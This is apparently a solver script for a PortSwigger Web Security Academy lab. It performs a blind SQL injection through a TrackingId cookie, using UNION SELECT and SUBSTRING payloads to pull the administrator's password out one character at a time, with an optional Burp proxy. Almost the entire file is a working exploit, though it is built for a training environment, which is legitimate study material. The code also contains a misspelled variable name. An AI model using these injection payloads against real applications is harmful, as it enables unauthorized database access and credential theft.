from requests import get, packages
from string import ascii_lowercase
from time import sleep
from sys import argv

packages.urllib3.disable_warnings() 

def usage():
    print(f"{__file__} <portswiggerURL> <session_id> [to_burp_proxy]")
    print("Examples:")
    print(f"\t{__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net aLqQRjXnIzZMk1YlCwD1HZl43WkJMBXC")
    print(f"\t{__file__} https://acef1f211f645ab480b369fd00670049.web-security-academy.net aLqQRjXnIzZMk1YlCwD1HZl43WkJMBXC to_burp_proxy")

proxy={
    "https" : "https://127.0.0.1:8080",
    "http" : "http://127.0.0.1:8080",
} #burpsuite!

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Close",
    "Referer": "https://acf61f301fa435ba80eb6501006c0034.web-security-academy.net/",
    "Upgrade-Insecure-Requests": "1"
}

def brute_force_password_character(url, session_id, to_burp_proxy=False):
    password=""
    for i in range(1, 27):
        for char in ascii_lowercase+"0123456789":
            cookie={
                "TrackingId": "xyz\' UNION SELECT 'a' FROM users WHERE username =" \
                   f"'administrator' AND SUBSTRING(password, {i}, 1) = '{char}'--; session={session_id}"
            }
            if to_bupr_proxy:
                resp=get(url, headers=headers, cookies=cookie, proxies=proxy, verify=False)
            else:
                resp=get(url, headers=headers, cookies=cookie, verify=False)
            if "Welcome" in resp.text:
                print(f"Found valid character: {char}")
                password+=char
                break
    return password 

if __name__ == "__main__":
    if len(argv) < 3:
        usage()
    elif len(argv) == 3:
        url=argv[1]
        session_id=argv[2]
        password=brute_force_password_character(url, session_id)
        print("Password :",  password)
    elif len(argv) == 4:
        url=argv[1]
        session_id=argv[2]
        password=brute_force_password_character(url, session_id, to_burp_proxy=True)
        print("Password :",  password)
